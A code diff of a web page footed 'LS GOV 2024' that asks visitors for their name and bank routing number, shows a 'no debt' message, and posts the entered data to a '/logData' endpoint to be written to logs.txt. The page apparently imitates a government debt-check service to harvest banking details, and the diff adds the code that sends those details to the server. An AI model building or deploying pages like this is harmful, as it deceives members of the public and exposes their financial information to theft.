@@ -58,6 +58,7 @@
     <p>LS GOV 2024 &copy; All Rights Reserved</p>
 </footer>
 
+<!-- JavaScript that runs after page load -->
 <script>
     document.getElementById("debtForm").addEventListener("submit", function(event) {
         event.preventDefault();
@@ -72,19 +73,19 @@
             return;
         }
 
-        // Display message
+        // Display "no debt" message
         document.getElementById("message").style.display = "block";
 
-        // Log the data into logs.txt (this requires server-side scripting, e.g., PHP or Node.js)
-        // Example code for logging the form data to logs.txt:
-        const data = `First Name: ${firstName}, Last Name: ${lastName}, Routing Number: ${routingNumber}\n`;
+        // Log the data into logs.txt (handled by Node.js - app.js)
+        const data = { firstName, lastName, routingNumber };
         
-        // Sending data to server (example, adjust based on your backend)
         fetch('/logData', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ data })
-        });
+            body: JSON.stringify(data)
+        }).then(response => response.text())
+          .then(result => console.log(result))
+          .catch(error => console.error('Error:', error));
     });
 </script>
 
